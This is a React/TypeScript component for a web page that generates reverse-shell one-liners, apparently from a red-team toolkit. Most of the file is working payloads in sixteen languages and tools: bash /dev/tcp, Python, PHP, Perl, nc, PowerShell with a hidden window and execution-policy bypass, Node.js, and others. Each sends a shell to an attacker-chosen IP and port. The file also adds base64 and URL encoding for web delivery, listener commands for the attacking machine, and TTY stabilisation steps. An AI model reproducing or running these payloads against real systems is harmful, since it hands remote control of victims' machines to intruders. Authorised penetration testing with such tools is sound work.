'use client'

import React, { useState } from 'react'
import { copyToClipboard } from '@/lib/utils'

type ShellType = 'bash' | 'python' | 'python3' | 'php' | 'perl' | 'ruby' | 'nc' | 'nc-openbsd' | 'powershell' | 'java' | 'xterm' | 'socat' | 'nodejs' | 'groovy' | 'lua' | 'awk'
type EncodingOption = 'none' | 'base64' | 'url'
type ShellBinary = '/bin/sh' | '/bin/bash' | '/bin/zsh'
type ListenerType = 'nc' | 'socat' | 'rlwrap'

const SHELL_TYPES: { id: ShellType; label: string }[] = [
  { id: 'bash', label: 'Bash' },
  { id: 'python', label: 'Python' },
  { id: 'python3', label: 'Python3' },
  { id: 'php', label: 'PHP' },
  { id: 'perl', label: 'Perl' },
  { id: 'ruby', label: 'Ruby' },
  { id: 'nc', label: 'Netcat (nc)' },
  { id: 'nc-openbsd', label: 'Netcat OpenBSD' },
  { id: 'powershell', label: 'PowerShell' },
  { id: 'java', label: 'Java' },
  { id: 'xterm', label: 'xterm' },
  { id: 'socat', label: 'Socat' },
  { id: 'nodejs', label: 'Node.js' },
  { id: 'groovy', label: 'Groovy' },
  { id: 'lua', label: 'Lua' },
  { id: 'awk', label: 'Awk' },
]

function generateShellCommand(type: ShellType, ip: string, port: string, shell: ShellBinary): string {
  switch (type) {
    case 'bash':
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`
    case 'python':
      return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["${shell}","-i"]);'`
    case 'python3':
      return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("${shell}")'`
    case 'php':
      return `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} -i <&3 >&3 2>&3");'`
    case 'perl':
      return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`
    case 'ruby':
      return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`
    case 'nc':
      return `nc -e ${shell} ${ip} ${port}`
    case 'nc-openbsd':
      return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`
    case 'powershell':
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    case 'java':
      return `Runtime r = Runtime.getRuntime();\nProcess p = r.exec(new String[]{"${shell}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done"});\np.waitFor();`
    case 'xterm':
      return `xterm -display ${ip}:1`
    case 'socat':
      return `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`
    case 'nodejs':
      return `(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("${shell}", []);var client = new net.Socket();client.connect(${port}, "${ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()`
    case 'groovy':
      return `String host="${ip}";int port=${port};String cmd="${shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`
    case 'lua':
      return `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('${shell} -i <&3 >&3 2>&3');"`
    case 'awk':
      return `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
  }
}

function getListenerCommand(type: ListenerType, port: string): string {
  switch (type) {
    case 'nc':
      return `nc -lvnp ${port}`
    case 'socat':
      return 'socat file:`tty`,raw,echo=0 tcp-listen:' + port
    case 'rlwrap':
      return `rlwrap nc -lvnp ${port}`
  }
}

function applyEncoding(cmd: string, encoding: EncodingOption, shellType: ShellType): string {
  if (encoding === 'none') return cmd
  if (encoding === 'base64') {
    const encoded = typeof window !== 'undefined' ? btoa(cmd) : Buffer.from(cmd).toString('base64')
    if (shellType === 'powershell') {
      return `powershell -e ${encoded}`
    }
    return `echo "${encoded}" | base64 -d | bash`
  }
  if (encoding === 'url') {
    return encodeURIComponent(cmd)
  }
  return cmd
}

const SHELL_UPGRADE_TIPS = [
  { label: 'Python PTY spawn', cmd: "python -c 'import pty; pty.spawn(\"/bin/bash\")'" },
  { label: 'Python3 PTY spawn', cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
  { label: 'Script TTY', cmd: 'script -qc /bin/bash /dev/null' },
  { label: 'Export TERM', cmd: 'export TERM=xterm' },
  { label: 'Background & raw mode', cmd: 'Ctrl+Z, then: stty raw -echo; fg' },
]

const LISTENER_TYPES: { id: ListenerType; label: string }[] = [
  { id: 'nc', label: 'Netcat' },
  { id: 'socat', label: 'Socat' },
  { id: 'rlwrap', label: 'rlwrap nc' },
]

export default function ReverseShellGenerator() {
  const [shellType, setShellType] = useState<ShellType>('bash')
  const [ip, setIp] = useState('10.10.10.10')
  const [port, setPort] = useState('4444')
  const [encoding, setEncoding] = useState<EncodingOption>('none')
  const [shellBinary, setShellBinary] = useState<ShellBinary>('/bin/sh')
  const [urlEncode, setUrlEncode] = useState(false)
  const [listenerType, setListenerType] = useState<ListenerType>('nc')
  const [copied, setCopied] = useState('')

  const copy = async (text: string, key: string) => {
    await copyToClipboard(text)
    setCopied(key)
    setTimeout(() => setCopied(''), 1500)
  }

  const rawCommand = generateShellCommand(shellType, ip, port, shellBinary)
  let finalCommand = applyEncoding(rawCommand, encoding, shellType)
  if (urlEncode && encoding !== 'url') {
    finalCommand = encodeURIComponent(finalCommand)
  }

  const listenerCmd = getListenerCommand(listenerType, port)

  return (
    <div className="space-y-5">
      <div>
        <h2 className="section-heading">Reverse Shell Generator</h2>
        <p className="section-subheading">Generate reverse shell one-liners for Red Team operations</p>
      </div>

      {/* Shell type tabs */}
      <div className="card">
        <div className="card-header"><span className="card-title">Shell Type</span></div>
        <div className="flex flex-wrap gap-2">
          {SHELL_TYPES.map(s => (
            <button key={s.id} onClick={() => setShellType(s.id)} className={`tab-btn ${shellType === s.id ? 'active' : ''}`}>
              {s.label}
            </button>
          ))}
        </div>
      </div>

      {/* Configuration */}
      <div className="card">
        <div className="card-header"><span className="card-title">Configuration</span></div>
        <div className="grid md:grid-cols-2 gap-4">
          <div>
            <label className="text-xs text-gray-400 mb-1 block">IP Address</label>
            <input
              className="cyber-input w-full"
              value={ip}
              onChange={e => setIp(e.target.value)}
              placeholder="10.10.10.10"
            />
          </div>
          <div>
            <label className="text-xs text-gray-400 mb-1 block">Port</label>
            <input
              className="cyber-input w-full"
              value={port}
              onChange={e => setPort(e.target.value)}
              placeholder="4444"
            />
          </div>
          <div>
            <label className="text-xs text-gray-400 mb-1 block">Encoding</label>
            <div className="flex gap-2">
              {(['none', 'base64', 'url'] as EncodingOption[]).map(enc => (
                <button
                  key={enc}
                  onClick={() => setEncoding(enc)}
                  className={`tab-btn ${encoding === enc ? 'active' : ''}`}
                >
                  {enc === 'none' ? 'None' : enc === 'base64' ? 'Base64' : 'URL'}
                </button>
              ))}
            </div>
          </div>
          <div>
            <label className="text-xs text-gray-400 mb-1 block">Shell Binary</label>
            <div className="flex gap-2">
              {(['/bin/sh', '/bin/bash', '/bin/zsh'] as ShellBinary[]).map(sh => (
                <button
                  key={sh}
                  onClick={() => setShellBinary(sh)}
                  className={`tab-btn ${shellBinary === sh ? 'active' : ''}`}
                >
                  {sh}
                </button>
              ))}
            </div>
          </div>
        </div>
        {/* Separate from encoding option — allows URL-encoding an already base64-encoded payload for web-based delivery */}
        <div className="mt-3 flex items-center gap-2">
          <input
            type="checkbox"
            id="urlEncode"
            checked={urlEncode}
            onChange={e => setUrlEncode(e.target.checked)}
            className="accent-blue-500"
          />
          <label htmlFor="urlEncode" className="text-xs text-gray-400 cursor-pointer">URL Encode command</label>
        </div>
      </div>

      {/* Generated command */}
      <div className="card">
        <div className="flex items-center justify-between mb-2">
          <span className="card-title">
            Reverse Shell Command
            <span className="badge ml-2">{SHELL_TYPES.find(s => s.id === shellType)?.label}</span>
            {encoding !== 'none' && <span className="badge ml-1">{encoding}</span>}
          </span>
          <button onClick={() => copy(finalCommand, 'shell')} className="btn-primary text-xs py-1">
            {copied === 'shell' ? '✓ Copied' : 'Copy'}
          </button>
        </div>
        <pre className="code-block text-xs whitespace-pre-wrap break-all">{finalCommand}</pre>
      </div>

      {/* Bash -c variant for bash type */}
      {shellType === 'bash' && encoding === 'none' && !urlEncode && (
        <div className="card">
          <div className="flex items-center justify-between mb-2">
            <span className="card-title">Bash -c Variant</span>
            <button
              onClick={() => copy(`bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`, 'bashc')}
              className="btn-primary text-xs py-1"
            >
              {copied === 'bashc' ? '✓ Copied' : 'Copy'}
            </button>
          </div>
          <pre className="code-block text-xs whitespace-pre-wrap break-all">
            {`bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`}
          </pre>
        </div>
      )}

      {/* Listener */}
      <div className="card">
        <div className="card-header"><span className="card-title">Listener Command</span></div>
        <div className="flex flex-wrap gap-2 mb-3">
          {LISTENER_TYPES.map(l => (
            <button key={l.id} onClick={() => setListenerType(l.id)} className={`tab-btn ${listenerType === l.id ? 'active' : ''}`}>
              {l.label}
            </button>
          ))}
        </div>
        <div className="flex items-center justify-between mb-2">
          <span className="text-xs text-gray-400">Start this on your attacking machine first</span>
          <button onClick={() => copy(listenerCmd, 'listener')} className="btn-primary text-xs py-1">
            {copied === 'listener' ? '✓ Copied' : 'Copy'}
          </button>
        </div>
        <pre className="code-block text-xs whitespace-pre-wrap break-all">{listenerCmd}</pre>
      </div>

      {/* Shell upgrade tips */}
      <div className="card">
        <div className="card-header"><span className="card-title">Shell Upgrade &amp; Stabilization</span></div>
        <p className="text-xs text-gray-500 mb-3">After catching a reverse shell, upgrade to a fully interactive TTY:</p>
        <div className="space-y-2">
          {SHELL_UPGRADE_TIPS.map((tip, i) => (
            <div key={i} className="flex items-center gap-3 p-2 rounded" style={{ background: 'rgba(10,20,40,0.5)', border: '1px solid rgba(0,212,255,0.06)' }}>
              <div className="flex-1">
                <div className="text-xs text-gray-400 mb-0.5">{tip.label}</div>
                <code className="text-xs font-mono text-gray-500 break-all">{tip.cmd}</code>
              </div>
              <button onClick={() => copy(tip.cmd, `tip-${i}`)} className="btn-primary text-xs py-1 shrink-0">
                {copied === `tip-${i}` ? '✓' : 'Copy'}
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
